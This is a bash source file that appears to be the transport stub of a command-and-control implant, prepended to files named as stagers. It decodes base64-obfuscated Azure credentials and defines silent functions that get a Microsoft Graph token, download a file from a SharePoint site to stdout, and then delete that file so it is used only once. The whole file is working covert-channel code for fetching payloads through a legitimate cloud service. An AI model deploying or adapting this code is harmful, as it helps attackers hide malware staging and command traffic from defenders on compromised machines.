# === TRANSPORT: Microsoft Graph API / SharePoint (stub layer) ===
# Provides _tk (get token), _dl (download), _rm (delete).
# Credentials substituted by wizard at deploy time.
# This file is prepended to agent/stub.sh and agent/stub_stageless.sh.

_ci=$(printf '%s' 'STUB_CLIENT_ID_B64'     | base64 -d 2>/dev/null)
_cs=$(printf '%s' 'STUB_CLIENT_SECRET_B64'  | base64 -d 2>/dev/null)
_ti=$(printf '%s' 'STUB_TENANT_ID_B64'      | base64 -d 2>/dev/null)
_rc=$(printf '%s' 'STUB_REFRESH_TOKEN_B64'  | base64 -d 2>/dev/null)
_si=$(printf '%s' 'STUB_SITE_ID_B64'        | base64 -d 2>/dev/null)

# -- get access token --
_tk() {
    local _u="https://login.microsoftonline.com/${_ti}/oauth2/v2.0/token"
    curl -sf -X POST "$_u" \
        -d "grant_type=refresh_token&refresh_token=${_rc}&client_id=${_ci}&client_secret=${_cs}&scope=Sites.ReadWrite.All%20offline_access" \
        2>/dev/null | grep -o '"access_token":"[^"]*"' | grep -o '"[^"]*"$' | tr -d '"'
}

# -- download file to stdout --
_dl() {
    curl -sf -X GET "https://graph.microsoft.com/v1.0/sites/${_si}/drive/root:${2}:/content" \
        -H "Authorization: Bearer ${1}" 2>/dev/null
}

# -- delete file (BK one-time use) --
_rm() {
    curl -sf -X DELETE "https://graph.microsoft.com/v1.0/sites/${_si}/drive/root:${2}:" \
        -H "Authorization: Bearer ${1}" >/dev/null 2>&1
}
